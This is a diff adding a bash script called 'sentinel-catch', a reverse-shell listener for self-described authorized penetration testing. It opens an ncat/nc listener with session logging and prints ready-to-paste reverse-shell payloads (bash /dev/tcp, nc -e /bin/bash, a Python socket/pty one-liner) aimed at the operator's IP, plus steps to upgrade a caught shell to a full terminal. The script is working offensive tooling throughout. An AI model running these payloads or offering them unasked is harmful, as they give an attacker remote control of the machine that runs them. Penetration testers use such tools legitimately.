@@ -1,0 +1,32 @@
+#!/usr/bin/env bash
+# sentinel-catch — a friendlier reverse-shell listener for authorized testing: line
+# history (rlwrap), session logging (ncat -o), and the payloads + PTY-upgrade steps
+# printed and ready to paste. e.g. `sentinel-catch 4444`.
+set -uo pipefail
+PORT="${1:-4444}"
+case "$PORT" in ''|*[!0-9]*) echo "usage: sentinel-catch [port]"; exit 1;; esac
+LOGD="$HOME/.sentinel/shells"; mkdir -p "$LOGD"
+F="$LOGD/catch-${PORT}-$(date -u +%Y%m%d-%H%M%S).log"
+IP="$(ip -4 route get 1 2>/dev/null | awk '{print $7; exit}')"
+NC="$(command -v ncat || command -v nc || true)"; [ -n "$NC" ] || { echo "install ncat (nmap) or nc"; exit 1; }
+RL="$(command -v rlwrap || true)"
+
+cat <<EOF
+$(printf '\e[1;36m== Sentinel catch · listening on 0.0.0.0:%s ==\e[0m' "$PORT")
+  payloads (point at ${IP:-<your-ip>}:$PORT):
+    bash -i >& /dev/tcp/${IP:-<your-ip>}/$PORT 0>&1
+    nc ${IP:-<your-ip>} $PORT -e /bin/bash
+    python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${IP:-<your-ip>}",$PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+  after you land a shell — upgrade to a full PTY:
+    python3 -c 'import pty;pty.spawn("/bin/bash")'
+    (then) Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm ; reset
+  session log: $F
+EOF
+
+# ncat logs the session with -o; plain nc can't, so fall back without logging.
+if command -v ncat >/dev/null; then
+  exec ${RL:+"$RL" }ncat -lvnp "$PORT" -o "$F"
+else
+  echo "  (nc has no session logging — install ncat for -o logging)"
+  exec ${RL:+"$RL" }nc -lvnp "$PORT"
+fi
